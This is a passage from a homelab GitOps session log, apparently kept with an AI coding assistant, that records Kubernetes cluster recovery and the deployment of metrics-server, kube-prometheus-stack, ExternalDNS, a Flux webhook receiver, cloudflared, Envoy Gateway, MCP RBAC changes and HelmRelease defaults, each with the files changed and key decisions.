- Cleared stale flux-instance Helm release secrets (`sh.helm.release.v1.flux-instance.v1/v2`) that were holding the release in `uninstalling` state; reinstalled flux-instance via `helm install`; flux-operator deployed all four Flux controllers
- Recreated `onepassword-connect-secrets` in `external-secrets` namespace (imperative bootstrap secret, NOT managed by ExternalSecrets) via `task bootstrap:onepassword-connect-secret`; this unblocked the entire ExternalSecrets downstream chain
- Recovered `onepassword-connect` HelmRelease from `Stalled: MissingRollbackTarget` condition: seeded revision 1 via `helm install --no-hooks`, then `flux reconcile helmrelease` to adopt
- Unblocked Longhorn namespace (`Terminating` for ~3 days): deleted `ValidatingWebhookConfiguration/longhorn-webhook-validator` and `MutatingWebhookConfiguration/longhorn-webhook-mutator` (cluster-scoped, survived namespace deletion), then patched finalizers on all 9 Longhorn CRD object types
- Ran cluster-doctor agent twice to confirm full recovery: 26/26 Kustomizations True, 17/17 HelmReleases True, 0 pods in error state, 3/3 nodes Ready
- Fixed the root cause: deleted bad OCIRepository, created `HelmRepository` at `https://kubernetes-sigs.github.io/metrics-server`, updated HelmRelease to use `chart.spec.sourceRef` instead of `chartRef`
- Documented root cause, recovery procedures, and prevention rules in QA.md (6 new entries) and CLUSTER.md (7 new troubleshooting rows, updated Secrets table)

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/meta/repos/oci/metrics-server.yaml` | Deleted — OCIRepository pointed at non-existent path |
| `kubernetes/flux/meta/repos/oci/kustomization.yaml` | Removed `./metrics-server.yaml` reference |
| `kubernetes/flux/meta/repos/helm/metrics-server.yaml` | Created — HelmRepository at `https://kubernetes-sigs.github.io/metrics-server` |
| `kubernetes/flux/meta/repos/helm/kustomization.yaml` | Added `./metrics-server.yaml` |
| `kubernetes/apps/kube-system/metrics-server/app/helmrelease.yaml` | Changed from `chartRef` (OCIRepository) to `chart.spec.sourceRef` (HelmRepository) |
| `docs/QA.md` | Added 6 new entries: Flux workflow overview + 4 Cluster Recovery entries + 2 GitOps source-type entries |
| `docs/CLUSTER.md` | Added 7 Troubleshooting table rows; added `onepassword-connect-secrets` to Secrets table |

### Key decisions
- **Manual helm install order is mandatory:** Cilium → CoreDNS → flux-instance; skipping or reordering fails because each step depends on the previous one being healthy
- **Longhorn webhooks must be deleted before patching finalizers:** `ValidatingWebhookConfiguration` and `MutatingWebhookConfiguration` are cluster-scoped and survive namespace deletion; they block every CRD patch with `failurePolicy: Fail`
- **`MissingRollbackTarget` recovery requires seeding revision 1:** The `Stalled` condition does not auto-retry; only seeding a valid revision via direct `helm install` + `flux reconcile helmrelease` breaks the deadlock
- **`onepassword-connect-secrets` is a bootstrap secret, not GitOps-managed:** It is the credential for the secret manager itself; it cannot be managed by ExternalSecrets; always recreate via `task bootstrap:onepassword-connect-secret` after cluster recovery
- **Never bypass a Kustomization finalizer to unblock reconciliation:** The correct fix is to resolve the source error (DENIED registry → wrong source type); bypassing the finalizer orphans all managed resources and can cascade to delete Cilium/CoreDNS

---

## 2026-05-15 — `metrics-server`

### Goal
Deploy metrics-server to provide pod and node resource metrics (CPU/memory) required for HPA and `kubectl top`.

### What we did
- Researched the archive reference (`/.archive/kubernetes/apps/kube-system/metrics-server/`) to understand the existing pattern — HelmRepository source, chart v3.12.2, four Talos-specific kubelet args, `serviceMonitor.enabled: true`
- Verified the reference's observability directory contains no metrics-server entry (it lives in `kube-system`, not `observability`)
- Confirmed chart v3.13.0 is latest via the Helm index at `https://kubernetes-sigs.github.io/metrics-server/index.yaml`
- Chose OCIRepository over HelmRepository to match cluster convention established by kube-prometheus-stack
- Created all deployment files following the `configMapGenerator` + `valuesFrom` + `kustomizeconfig.yaml` pattern matching spegel/coredns
- Added `substitution.flux.home.arpa/disabled: "true"` to ks.yaml (system chart, no cluster variable substitution needed)
- Enabled `serviceMonitor.enabled: true` so Prometheus scrapes metrics-server's own `/metrics` (CRDs already live from kube-prometheus-stack)
- No `dependsOn` needed — ROADMAP confirmed no hard dependencies beyond a running cluster

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/meta/repos/oci/metrics-server.yaml` | Created — OCIRepository `ghcr.io/kubernetes-sigs/charts/metrics-server` pinned to v3.13.0 |
| `kubernetes/flux/meta/repos/oci/kustomization.yaml` | Added `./metrics-server.yaml` |
| `kubernetes/apps/kube-system/metrics-server/ks.yaml` | Created — Flux Kustomization; substitution disabled; healthCheck on HelmRelease |
| `kubernetes/apps/kube-system/metrics-server/app/helmrelease.yaml` | Created — HelmRelease via `chartRef`; `valuesFrom` ConfigMap |
| `kubernetes/apps/kube-system/metrics-server/app/kustomization.yaml` | Created — `configMapGenerator` + `kustomizeconfig.yaml` wiring |
| `kubernetes/apps/kube-system/metrics-server/app/helm/kustomizeconfig.yaml` | Created — disables hash suffix, propagates name to `spec.valuesFrom` |
| `kubernetes/apps/kube-system/metrics-server/app/helm/values.yaml` | Created — 4 Talos kubelet args; serviceMonitor; resource requests |
| `kubernetes/apps/kube-system/kustomization.yaml` | Added `./metrics-server/ks.yaml` |

### Key decisions
- **OCIRepository over HelmRepository** — archive used `https://kubernetes-sigs.github.io/metrics-server` (HelmRepository); chose OCI (`ghcr.io/kubernetes-sigs/charts/metrics-server`) for consistency with every other post-bootstrap chart in this cluster
- **No `dependsOn`** — serviceMonitor CRD already exists from kube-prometheus-stack; ROADMAP explicitly lists no hard deps; adding one would be a bootstrap-order constraint with no operational benefit

---

## 2026-05-15 — `kube-prometheus-stack`

### Goal
Deploy kube-prometheus-stack to provide cluster-wide observability: Prometheus metrics, Alertmanager routing, and Grafana dashboards, with alerting rules for pod failures, HelmRelease health, disk pressure, and Longhorn replica robustness.

### What we did
- Reviewed ROADMAP; identified kube-prometheus-stack as highest-value unblocked item (all deps live: cert-manager, ESO+1Password, Longhorn)
- Entered plan mode; launched two parallel Explore agents — one to read both reference implementations (`home-ops.old` v75.10.0 and `bykaj` v85.0.2) in full, one to map current cluster patterns (OCI repos, app structure, ExternalSecret format, cluster variables)
- Confirmed user decisions: skip Grafana (follow-up session), skip Alertmanager receiver (follow-up session), namespace `observability` (user override from ROADMAP's `monitoring`)
- Read `envoy-gateway/config/gateway.yaml` to confirm `envoy-internal` listener section name is `https` and `allowedRoutes.namespaces.from: All`
- Verified `dependsOn` target names (`longhorn`, `onepassword-store`) live in cluster before writing ks.yaml
- Created OCIRepository in `flux/meta/repos/oci/` (cluster convention) rather than per-app dir as both references do
- Created explicit HTTPRoute resources (not chart-built-in Gateway API support) to avoid version-specific values schema dependency; backends target `kube-prometheus-stack-prometheus:9090` and `kube-prometheus-stack-alertmanager:9093`
- Set five `*SelectorNilUsesHelmValues: false` flags so Prometheus discovers ServiceMonitors/PodMonitors across all namespaces (not just own release)
- Added `monitoring.enabled: true` to Longhorn values so Longhorn metrics are scraped as soon as Prometheus comes up
- Added `node-role.kubernetes.io/control-plane: NoSchedule` tolerations to all non-DaemonSet components (prometheus, alertmanager, prometheusOperator, kube-state-metrics)
- Disabled `kubeProxy` (Cilium replacement) and `kubeEtcd` (Talos etcd requires additional scrape config)
- Changes unstaged — session closed before `/git-stage`

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/meta/repos/oci/kube-prometheus-stack.yaml` | Created — OCIRepository `ghcr.io/prometheus-community/charts/kube-prometheus-stack` pinned to v75.10.0 |
| `kubernetes/flux/meta/repos/oci/kustomization.yaml` | Added `./kube-prometheus-stack.yaml` |
| `kubernetes/apps/kustomization.yaml` | Added `./observability` |
| `kubernetes/apps/observability/kustomization.yaml` | Created — namespace entry pointing to ks.yaml |
| `kubernetes/apps/observability/kube-prometheus-stack/ks.yaml` | Created — Flux Kustomization; dependsOn longhorn + onepassword-store; healthCheck on HelmRelease |
| `kubernetes/apps/observability/kube-prometheus-stack/app/namespace.yaml` | Created — `observability` Namespace |
| `kubernetes/apps/observability/kube-prometheus-stack/app/kustomization.yaml` | Created — configMapGenerator for values; resources: namespace, helmrelease, httproute |
| `kubernetes/apps/observability/kube-prometheus-stack/app/helmrelease.yaml` | Created — HelmRelease via `chartRef` to OCIRepository; valuesFrom ConfigMap |
| `kubernetes/apps/observability/kube-prometheus-stack/app/helm/values.yaml` | Created — grafana/kubeProxy/kubeEtcd disabled; all-namespace selectors; Longhorn PVCs (20Gi Prometheus, 1Gi AM); CP tolerations |
| `kubernetes/apps/observability/kube-prometheus-stack/app/httproute.yaml` | Created — HTTPRoutes for `prometheus.${CLUSTER_DOMAIN}` and `alertmanager.${CLUSTER_DOMAIN}` on envoy-internal |
| `kubernetes/apps/longhorn-system/longhorn/app/helm/values.yaml` | Added `monitoring.enabled: true` to enable Longhorn ServiceMonitor scraping |

### Key decisions
- **`observability` namespace** — user override; ROADMAP said `monitoring` but both reference implementations use `observability`
- **No Alertmanager receiver** — stack deploys functional but silent; receiver (Discord or SMTP) wired in a follow-up session once the stack proves stable
- **Grafana disabled** — both references disable it in the stack and deploy it separately; avoids adding a third PVC and admin-secret complexity to this rollout
- **Explicit HTTPRoutes instead of chart-built-in Gateway API** — the chart's `route:` values schema varies by version; explicit resources are transparent and version-independent
- **OCIRepository in `flux/meta/repos/oci/`** — both references put it per-app; cluster convention is shared source registry regardless of single vs. multi-consumer

---

## 2026-05-14 — `external-dns-split`

### Goal
Deploy ExternalDNS in split-DNS mode: Cloudflare instance for public records and UniFi UDM Pro Max webhook instance for internal LAN resolution.

### What we did
- Explored bykaj/home-ops reference implementation and current cluster network structure in parallel via Explore agents; found bykaj uses per-instance OCIRepositories inside app dirs — deviated to a single shared OCIRepository in `flux/meta/repos/oci/` following the cluster's own established pattern
- Discovered cert-manager ClusterIssuer uses `API_TOKEN` field in the `cloudflare` 1Password item (not `CF_API_TOKEN`); used ESO `data[].secretKey/remoteRef.property` to bridge `API_TOKEN → CF_API_TOKEN` in the Kubernetes Secret — no 1Password changes needed for Cloudflare instance
- Created 9 new files: shared OCIRepository, multi-doc `ks.yaml` (both Kustomizations), and `cloudflare/` + `unifi/` subdirs each with `kustomization.yaml`, `externalsecret.yaml`, `helmrelease.yaml`
- Cloudflare instance: `--gateway-name=envoy-external` filter (only public routes), `--cloudflare-proxied`, `sources: [gateway-httproute, crd]`, `txtOwnerId: k8s`
- UniFi instance: no gateway-name filter (watches all gateways for split-horizon LAN DNS), `sources: [gateway-httproute, service]`, `txtOwnerId: k8s-internal`, `UNIFI_SKIP_TLS_VERIFY: "true"`, `provider.name: webhook` structured format (chart v1.21.1)
- Wired `external-dns/ks.yaml` into `kubernetes/apps/network/kustomization.yaml` and `external-dns.yaml` into `flux/meta/repos/oci/kustomization.yaml`
- Moved ExternalDNS from ROADMAP In Progress → Completed; updated CLAUDE.md status table; changes unstaged (session interrupted before `/git-stage` completed)

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/meta/repos/oci/external-dns.yaml` | Created — shared OCIRepository for external-dns chart v1.21.1 |
| `kubernetes/flux/meta/repos/oci/kustomization.yaml` | Added `./external-dns.yaml` entry |
| `kubernetes/apps/network/external-dns/ks.yaml` | Created — multi-doc Flux Kustomizations for cloudflare + unifi instances |
| `kubernetes/apps/network/external-dns/cloudflare/kustomization.yaml` | Created |
| `kubernetes/apps/network/external-dns/cloudflare/externalsecret.yaml` | Created — maps 1P `API_TOKEN` → `CF_API_TOKEN` |
| `kubernetes/apps/network/external-dns/cloudflare/helmrelease.yaml` | Created |
| `kubernetes/apps/network/external-dns/unifi/kustomization.yaml` | Created |
| `kubernetes/apps/network/external-dns/unifi/externalsecret.yaml` | Created — `UNIFI_HOST` + `UNIFI_API_KEY` from 1P `unifi` item |
| `kubernetes/apps/network/external-dns/unifi/helmrelease.yaml` | Created |
| `kubernetes/apps/network/kustomization.yaml` | Added `./external-dns/ks.yaml` |
| `docs/ROADMAP.md` | Removed ExternalDNS In Progress section; added Completed row |
| `CLAUDE.md` | Updated Split DNS + ESO+1Password status to Done; added session log row |

### Key decisions
- Single shared OCIRepository in `flux/meta/repos/oci/` rather than per-instance OCIRepositories (bykaj pattern) — follows cluster convention of one chart source per chart; both HelmReleases reference `chartRef.name: external-dns`
- ESO `data[].secretKey/remoteRef.property` bridges `API_TOKEN` (existing 1Password field, used by cert-manager) → `CF_API_TOKEN` (ExternalDNS env var) without requiring any 1Password item changes
- `--gateway-name=envoy-external` on Cloudflare instance only; UniFi has no filter so it creates LAN A records for all routes on both gateways (true split-horizon: internal clients resolve to 10.60.0.230/.231 directly)
- `txtOwnerId: k8s` (Cloudflare) vs `k8s-internal` (UniFi) — prevents TXT ownership record collisions when both instances manage the same hostname
- Used `provider.name: webhook` + `provider.webhook:` structured chart values format (v1.21.1) rather than legacy `sidecars:` approach documented in the ROADMAP (superseded by newer chart API)
- UniFi instance will remain `ExternalSecret NotReady` until 1Password `unifi` item is created (`UNIFI_HOST` + `UNIFI_API_KEY`); harmless — does not affect Cloudflare instance

---

## 2026-05-14 — `flux-webhook-receiver`

### Goal
Deploy Flux GitHub webhook receiver to cut reconcile latency from ~5 minutes to seconds, providing near-instant GitOps updates on every push.

### What we did
- Surveyed archive, home-ops-bykaj, and home-ops.old — all three co-locate receiver files in `flux-instance/app/`; decided against this because `flux-instance/ks.yaml` carries `substitution.flux.home.arpa/disabled: "true"`, which would prevent `${CLUSTER_DOMAIN}` substitution in the HTTPRoute
- Created a separate `flux-receiver` Kustomization in `kubernetes/apps/flux-system/flux-receiver/` so the cluster-apps patch injects `substituteFrom` automatically
- ExternalSecret pulls `FLUX_GITHUB_WEBHOOK_TOKEN` from 1Password item `flux`; Receiver CR targets `GitRepository/flux-system` + `Kustomization/flux-system` (standard pattern from all reference repos)
- HTTPRoute attached to `envoy-external` (sectionName: `https`) routing `flux-webhook.vwn.io/hook/*` → `webhook-receiver:80` in `flux-system`
- Fixed cloudflared ExternalSecret property name `TOKEN` → `TUNNEL_TOKEN` (bundled in same commit)
- Diagnosed "failed to connect to host" on first GitHub ping delivery: Cloudflare DNS Tunnel record for `flux-webhook` was DNS-only (gray cloud); toggling to Proxied (orange cloud) resolved it immediately
- Confirmed end-to-end via GitHub Redeliver + `flux logs --kind=Receiver`: GitHub ping → Cloudflare → cloudflared → Envoy Gateway → webhook-receiver → 200 OK
- Updated ROADMAP: removed cloudflared and flux-webhook-receiver from In Progress; added both to Completed table

### Files changed
| File | Change |
|------|--------|
| `kubernetes/apps/flux-system/flux-receiver/ks.yaml` | Created — Flux Kustomization, dependsOn flux-operator + onepassword-connect |
| `kubernetes/apps/flux-system/flux-receiver/app/kustomization.yaml` | Created — lists externalsecret, receiver, httproute |
| `kubernetes/apps/flux-system/flux-receiver/app/externalsecret.yaml` | Created — pulls FLUX_GITHUB_WEBHOOK_TOKEN from 1Password |
| `kubernetes/apps/flux-system/flux-receiver/app/receiver.yaml` | Created — github Receiver targeting GitRepository + Kustomization/flux-system |
| `kubernetes/apps/flux-system/flux-receiver/app/httproute.yaml` | Created — flux-webhook.vwn.io/hook/* → webhook-receiver:80 |
| `kubernetes/apps/flux-system/kustomization.yaml` | Added `./flux-receiver/ks.yaml` |
| `kubernetes/apps/network/cloudflared/app/externalsecret.yaml` | Fixed 1Password property name TOKEN → TUNNEL_TOKEN |
| `docs/ROADMAP.md` | Moved cloudflared and flux-webhook-receiver to Completed |

### Key decisions
- **Separate Kustomization over co-location**: all reference repos put receiver files in `flux-instance/app/`, but our `flux-instance` has substitution disabled; a dedicated `flux-receiver` Kustomization without that label gets `${CLUSTER_DOMAIN}` injected automatically via the cluster-apps patch
- **ExternalSecret over SOPS**: consistent with this repo's app-secrets strategy; the token is not a bootstrap credential
- **Receiver targets `Kustomization/flux-system`** (not `cluster-apps`): the flux-system Kustomization owns the full cluster tree and re-evaluating it cascades through all dependencies — matches the pattern used by all three reference repos

---

## 2026-05-14 — `cert-promotion-cloudflared`

### Goal
Promote the wildcard TLS certificate from letsencrypt-staging to letsencrypt-production and deploy Cloudflare Tunnel (cloudflared) to establish external ingress through Cloudflare's edge.

### What we did
- Changed `issuerRef.name` in `certificate.yaml` from `letsencrypt-staging` to `letsencrypt-production`; committed and reconciled; deleted the staging secret to force immediate re-issuance rather than waiting for the renewal window
- Diagnosed a transient Certificate object visibility anomaly: issuance completed (R13 cert issued at 15:08) but the Certificate CR disappeared from the API server until `flux reconcile kustomization envoy-gateway-config --with-source` re-applied it — likely a transient API server cache issue
- Confirmed production cert: issuer `C=US, O=Let's Encrypt, CN=R13`, valid May–August 2026, secret `network/wildcard-production-tls` present
- Added `app-template` OCIRepository (`oci://ghcr.io/bjw-s-labs/helm/app-template` v4.2.0) — not present in this repo yet; sourced from archive reference
- Checked live cluster services: Envoy Gateway creates a Service named identically to the Gateway resource (`envoy-external`) in the same namespace — stable internal DNS target at `envoy-external.network.svc.cluster.local`
- Scaffolded full cloudflared deployment under `kubernetes/apps/network/cloudflared/`: `ks.yaml`, `app/kustomization.yaml`, `app/externalsecret.yaml`, `app/helmrelease.yaml`, `app/resources/config.yaml`
- ExternalSecret pulls `TUNNEL_TOKEN` from 1Password item `cloudflared` field `TOKEN`; cloudflared runs as 2 replicas, RollingUpdate, `readOnlyRootFilesystem`, non-root (uid 65534)
- Tunnel config routes `*.${CLUSTER_DOMAIN}` and `${CLUSTER_DOMAIN}` → `https://envoy-external.network.svc.cluster.local`; `noTLSVerify: true` with `originServerName: gateway.${CLUSTER_DOMAIN}` to satisfy Envoy's SNI filter chain selection without importing the Let's Encrypt root into cloudflared
- Reconciled and confirmed tunnel connected
- Updated `docs/CLUSTER.md`: corrected wildcard cert note (staging → production); added cloudflared component section

### Files changed

| File | Change |
|------|--------|
| `kubernetes/apps/network/envoy-gateway/config/certificate.yaml` | `issuerRef.name` changed from `letsencrypt-staging` to `letsencrypt-production` |
| `kubernetes/flux/meta/repos/oci/app-template.yaml` | Created — OCIRepository for bjw-s/app-template v4.2.0 |
| `kubernetes/flux/meta/repos/oci/kustomization.yaml` | Added `./app-template.yaml` |
| `kubernetes/apps/network/cloudflared/ks.yaml` | Created — Flux Kustomization; depends on `envoy-gateway-config` + `onepassword-store` |
| `kubernetes/apps/network/cloudflared/app/kustomization.yaml` | Created — app entry-point with configMapGenerator for tunnel config |
| `kubernetes/apps/network/cloudflared/app/externalsecret.yaml` | Created — pulls `TUNNEL_TOKEN` from 1Password `cloudflared` item |
| `kubernetes/apps/network/cloudflared/app/helmrelease.yaml` | Created — 2-replica cloudflared Deployment via app-template |
| `kubernetes/apps/network/cloudflared/app/resources/config.yaml` | Created — tunnel ingress rules with `noTLSVerify` + `originServerName` |
| `kubernetes/apps/network/kustomization.yaml` | Added `./cloudflared/ks.yaml` |
| `docs/CLUSTER.md` | Updated cert issuer note; added cloudflared section |

### Key decisions

- **HTTPS to envoy-external, not HTTP**: the HTTP listener on `envoy-external` unconditionally redirects to HTTPS — cloudflared connecting on port 80 would get 301s back to the client, causing a redirect loop. HTTPS (port 443) is required.
- **`noTLSVerify: true` + `originServerName`**: to connect via HTTPS, Envoy needs a matching SNI to select the `*.${CLUSTER_DOMAIN}` filter chain. Without `originServerName`, cloudflared sends the service hostname (`envoy-external.network.svc.cluster.local`) as SNI, which doesn't match. Setting `originServerName: gateway.${CLUSTER_DOMAIN}` (any `*.vwn.io` value works) satisfies Envoy's filter chain selection; `noTLSVerify: true` skips cert validation for this internal hop — safe because the connection is within the cluster network.
- **Single `TUNNEL_TOKEN` field vs. 3-field decomposition**: the archive reconstructs the token from `ACCOUNT_TAG` + `TUNNEL_ID` + `TUNNEL_SECRET`. Using a single token from the Cloudflare dashboard (which already encodes all three) is simpler and requires only one 1Password field.

---

## 2026-05-14 — `cilium-gateway-api`

### Goal
Implement Cilium Gateway API with L2 LoadBalancer as ingress infrastructure: enable Gateway API on Cilium, allocate an IP pool, create a Gateway resource, and wire a cert-manager ClusterIssuer for Let's Encrypt DNS-01 via Cloudflare.

### What we did
- Evaluated Cilium built-in Gateway API vs Envoy Gateway; chose Envoy Gateway for richer extension APIs (`SecurityPolicy`, `ClientTrafficPolicy`, OIDC support) and full conformance — updated ROADMAP accordingly
- Added `CiliumLoadBalancerIPPool` (10.60.0.230–249) and `CiliumL2AnnouncementPolicy` in a new `cilium-config` Kustomization (separate from the HelmRelease Kustomization to avoid Flux dry-run ordering failure)
- Created OCIRepository for Envoy Gateway at `oci://docker.io/envoyproxy/gateway-helm` v1.7.3 — discovered Envoy has no traditional Helm repository, only OCI
- Deployed Envoy Gateway HelmRelease with `GatewayNamespace` mode (proxy pods created per-Gateway namespace for isolation)
- Created `EnvoyProxy` (2 replicas, 512Mi limit), `GatewayClass`, and `ClientTrafficPolicy` (XFF trust from pod CIDR, TLS 1.2 min, h2+http/1.1)
- Created two Gateways with pinned IPs via `lbipam.cilium.io/ips` annotation: `envoy-external` (10.60.0.230), `envoy-internal` (10.60.0.231), each with HTTP + HTTPS listeners
- Created wildcard `Certificate` for `*.${CLUSTER_DOMAIN}` using `letsencrypt-staging` issuer; DNS-01 challenge via Cloudflare — staging to avoid burning production rate limits
- Added HTTP→HTTPS redirect `HTTPRoute` on both gateways
- Fixed three bugs during reconciliation: HelmRepository→OCIRepository source type; missing `network` Namespace manifest; `api-token`→`API_TOKEN` key in ClusterIssuers (ESO `dataFrom.extract` preserves 1Password field names verbatim)
- DNS-01 propagation in progress at session close; staging cert expected to issue without further action

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/meta/repos/oci/envoy-gateway.yaml` | Created OCIRepository for Envoy Gateway v1.7.3 |
| `kubernetes/flux/meta/repos/oci/kustomization.yaml` | Added `envoy-gateway.yaml` |
| `kubernetes/flux/meta/repos/helm/kustomization.yaml` | Removed wrong `envoy-gateway.yaml` entry |
| `kubernetes/flux/meta/repos/helm/envoy-gateway.yaml` | Deleted (wrong source type — no charts.envoyproxy.io exists) |
| `kubernetes/apps/kustomization.yaml` | Added `./network` |
| `kubernetes/apps/network/kustomization.yaml` | Created; lists `envoy-gateway/ks.yaml` |
| `kubernetes/apps/network/envoy-gateway/ks.yaml` | Created multi-doc: `envoy-gateway` + `envoy-gateway-config` Kustomizations |
| `kubernetes/apps/network/envoy-gateway/app/namespace.yaml` | Created `Namespace/network` |
| `kubernetes/apps/network/envoy-gateway/app/kustomization.yaml` | Created; lists namespace + helmrelease |
| `kubernetes/apps/network/envoy-gateway/app/helmrelease.yaml` | Created HelmRelease using `chartRef` (OCIRepository) |
| `kubernetes/apps/network/envoy-gateway/config/envoy.yaml` | Created `EnvoyProxy` + `GatewayClass` + `ClientTrafficPolicy` |
| `kubernetes/apps/network/envoy-gateway/config/certificate.yaml` | Created wildcard Certificate (staging issuer) |
| `kubernetes/apps/network/envoy-gateway/config/gateway.yaml` | Created `envoy-external` + `envoy-internal` Gateways |
| `kubernetes/apps/network/envoy-gateway/config/httproute.yaml` | Created HTTP→HTTPS redirect HTTPRoutes |
| `kubernetes/apps/network/envoy-gateway/config/kustomization.yaml` | Created; lists all config resources |
| `kubernetes/apps/kube-system/cilium/config/networks.yaml` | Created `CiliumLoadBalancerIPPool` + `CiliumL2AnnouncementPolicy` |
| `kubernetes/apps/kube-system/cilium/config/kustomization.yaml` | Created; lists `networks.yaml` |
| `kubernetes/apps/kube-system/cilium/ks.yaml` | Added `cilium-config` Kustomization (split from main HelmRelease ks) |
| `kubernetes/apps/cert-manager/cluster-issuers/app/clusterissuer-production.yaml` | Fixed `api-token` → `API_TOKEN` |
| `kubernetes/apps/cert-manager/cluster-issuers/app/clusterissuer-staging.yaml` | Fixed `api-token` → `API_TOKEN` |
| `docs/ROADMAP.md` | Updated ingress section: Cilium GW API → Envoy Gateway with full architecture description |

### Key decisions
- Chose Envoy Gateway over Cilium's built-in Gateway API: richer extension APIs (`SecurityPolicy` for OIDC, `ClientTrafficPolicy` for XFF/TLS config), full conformance suite, better long-term flexibility
- IP pool 10.60.0.230–249: leaves .204–.229 as node-expansion buffer, keeps pool clearly separated from management IPs (.201–.203)
- `GatewayNamespace` deployment mode: Envoy proxy pods created per-Gateway namespace (vs `Shared` = one proxy for all), giving better network isolation at the cost of one extra Deployment per gateway
- Staging cert first: conserves Let's Encrypt production rate limits (50 certs/domain/week); promote to production once DNS-01 validates by swapping `issuerRef` and deleting the old TLS secret
- Separate `cilium-config` Kustomization from `cilium` HelmRelease: required because Flux dry-runs CRD instances before the operator is installed — `dependsOn` + `healthChecks` enforces correct ordering

---

## 2026-05-14 — `mcp-rbac-expansion`

### Goal
Expand MCP viewer RBAC to cover all CRD API groups deployed in the cluster, so diagnostic tools can query Longhorn, cert-manager, ESO, Cilium, and other CRDs without kubectl fallbacks.

### What we did
- Audited MCP viewer ClusterRole (`scripts/mcp.sh`) against all CRD API groups present in the cluster (`kubectl api-resources` across every group)
- Found 8 missing API groups: `longhorn.io`, `cert-manager.io`, `acme.cert-manager.io`, `external-secrets.io`, `onepassword.com`, `cilium.io`, `fluxcd.controlplane.io`, `notification.toolkit.fluxcd.io`
- Found a silent bug: the ClusterRole listed `upgrade.talos.dev` for tuppr CRDs — the actual API group on this cluster is `tuppr.home-operations.com`, so `TalosUpgrade`/`KubernetesUpgrade` were inaccessible despite being listed
- Switched all CRD group rules from explicit resource lists to `resources: ["*"]` — wildcard within a known group means new CRD resources in that group are covered automatically; only a new operator with a new API group requires a future script update
- Retained the core `""` group as an explicit allowlist to keep `secrets` out of MCP's reach
- Re-ran `bash scripts/mcp.sh renew-token 8h` to apply the updated ClusterRole and mint a fresh token
- Verified via MCP tool that `longhorn.io/v1beta2 Node talos-cp-01` is now readable: `Ready=True`, `Schedulable=True`, ~913 GiB available

### Files changed
| File | Change |
|------|--------|
| `scripts/mcp.sh` | Added 8 missing CRD API groups with `resources: ["*"]`; switched existing groups to wildcard; fixed `upgrade.talos.dev` → `tuppr.home-operations.com` |

### Key decisions
- Used `resources: ["*"]` per API group rather than enumerating resource names — reduces ongoing maintenance; a new CRD resource in an existing group is zero-maintenance, only a new operator triggers a script edit
- Deliberate exclusion of `secrets` from the core group — MCP is a diagnostic/read path and must not surface raw secret values

---

## 2026-05-14 — `global-helmrelease-defaults`

### Goal
Apply the Global HelmRelease Defaults Patch to inject cluster-wide CRD management and upgrade remediation settings into all HelmRelease resources via the `cluster-apps` Kustomization.

### What we did
- Compared ROADMAP spec with bykaj reference implementation; found the ROADMAP's described patch (direct `HelmRelease` targeting in `cluster-apps`) cannot work — `cluster-apps` only renders child `Kustomization` objects, so a direct HelmRelease patch silently matches nothing
- Implemented the bykaj nested patch pattern: outer patch injects `spec.patches` into each child Kustomization; inner patch targets HelmReleases within those children at their own reconcile time
- Added full HelmRelease defaults: `install.crds: CreateReplace`, `install.remediation` (retries: 3, remediateLastFailure: true), `timeout: 10m`, `upgrade.cleanupOnFail: true`, `upgrade.crds: CreateReplace`, `upgrade.remediation` (retries: 2, remediateLastFailure: true)
- Added a second `cluster-apps` patch injecting `retryInterval: 2m` and `timeout: 5m` as global Kustomization timing defaults (bykaj pattern)
- Cleaned up all 12 child `ks.yaml` files: removed now-redundant `retryInterval: 2m` and `timeout: 5m`; retained three intentional `timeout: 10m` overrides (cilium, longhorn, tuppr operator)
- Moved "Global HelmRelease Defaults Patch" from Researched Patterns to Completed in `ROADMAP.md`
- Updated `CLAUDE.md` convention section: replaced per-chart `crds: CreateReplace` note with full cluster-wide defaults reference including install remediation
- Added `### cluster-apps patches` subsection to `CLUSTER.md` documenting all three patches and explaining the nested patch mechanism in plain terms

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/cluster/ks.yaml` | Added Kustomization timings patch and nested HelmRelease defaults patch to `cluster-apps` |
| `docs/CLUSTER.md` | Added `cluster-apps patches` section documenting all three patches and nested patch mechanism |
| `docs/ROADMAP.md` | Moved Global HelmRelease Defaults Patch to Completed table |
| `CLAUDE.md` | Updated HelmRelease convention section with full cluster-wide defaults; session log row updated |
| `kubernetes/apps/openebs/openebs/ks.yaml` | Removed redundant `timeout`/`retryInterval` |
| `kubernetes/apps/flux-system/flux-instance/ks.yaml` | Removed redundant `timeout`/`retryInterval` |
| `kubernetes/apps/flux-system/flux-operator/ks.yaml` | Removed redundant `timeout`/`retryInterval` |
| `kubernetes/apps/external-secrets/external-secrets/ks.yaml` | Removed redundant `timeout`/`retryInterval` from both docs |
| `kubernetes/apps/external-secrets/onepassword-connect/ks.yaml` | Removed redundant `timeout`/`retryInterval` |
| `kubernetes/apps/cert-manager/cert-manager/ks.yaml` | Removed redundant `timeout`/`retryInterval` |
| `kubernetes/apps/cert-manager/cluster-issuers/ks.yaml` | Removed redundant `timeout`/`retryInterval` |
| `kubernetes/apps/kube-system/cilium/ks.yaml` | Removed redundant `retryInterval` (`timeout: 10m` retained) |
| `kubernetes/apps/kube-system/coredns/ks.yaml` | Removed redundant `timeout`/`retryInterval` |
| `kubernetes/apps/kube-system/spegel/ks.yaml` | Removed redundant `timeout`/`retryInterval` |
| `kubernetes/apps/longhorn-system/longhorn/ks.yaml` | Removed redundant `retryInterval` (`timeout: 10m` retained) |
| `kubernetes/apps/system-upgrade/tuppr/ks.yaml` | Removed redundant `retryInterval` from tuppr doc (`timeout: 10m` retained); removed `timeout`/`retryInterval` from tuppr-upgrade doc |

### Key decisions
- Used nested patch pattern (Kustomization→HelmRelease) rather than ROADMAP's direct HelmRelease patch — the direct approach silently no-ops because HelmRelease objects are not in scope of `cluster-apps`'s kustomize build
- Added `install.remediation` beyond the ROADMAP spec — failed installs without cleanup leave partial resources that cause "already exists" errors on retry; remediation (uninstall) ensures each retry starts clean
- Used `retries: 3` for install vs `retries: 2` for upgrade — installs face more variance (cold image pulls, CRD propagation, webhook timing) than incremental upgrades
- Kept Kustomization `timeout: 5m` (not bykaj's 10m) — sufficient since `wait: false` on `cluster-apps` means the timeout only covers the kustomize build + apply phase, not app readiness

---

## 2026-05-14 — `roadmap-cleanup`

### Goal
